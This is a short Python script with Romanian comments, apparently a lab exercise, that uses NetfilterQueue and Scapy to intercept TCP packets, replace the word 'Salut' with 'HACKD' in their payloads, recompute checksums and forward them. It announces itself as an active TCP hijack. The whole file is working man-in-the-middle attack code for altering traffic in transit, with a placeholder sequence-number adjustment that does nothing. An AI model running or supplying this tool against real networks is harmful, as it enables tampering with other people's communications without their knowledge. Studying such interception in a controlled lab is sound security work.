from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def procesare(pkt):
    pachet = IP(pkt.get_payload())

    if pachet.haslayer(Raw) and pachet.haslayer(TCP):
        payload = pachet[Raw].load
        if b"Salut" in payload:
            original_len = len(payload)
            nou_payload = payload.replace(b"Salut", b"HACKD")
            nou_len = len(nou_payload)
            diferenta = nou_len - original_len

            print(f"[+] Mesaj original: {payload.decode(errors='ignore')}")
            print(f"[+] Modificat și payload trimis: {nou_payload.decode(errors='ignore')}")

            pachet[Raw].load = nou_payload

            # Dacă e nevoie, ajustăm seq sau ack
            # Doar dacă e pachet de la client -> server și SEQ contează
            if pachet[TCP].flags == "PA":
                pachet[TCP].seq += 0  # Poți ajusta dacă știi ce urmează

            # Recalculăm automat lungimea și checksum-urile
            del pachet[IP].len
            del pachet[IP].chksum
            del pachet[TCP].chksum

            pkt.set_payload(bytes(pachet))

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, procesare)

try:
    print("[*] TCP hijack activ pe coada 1...")
    nfqueue.run()
except KeyboardInterrupt:
    print("[!] Oprit manual.")
    nfqueue.unbind()
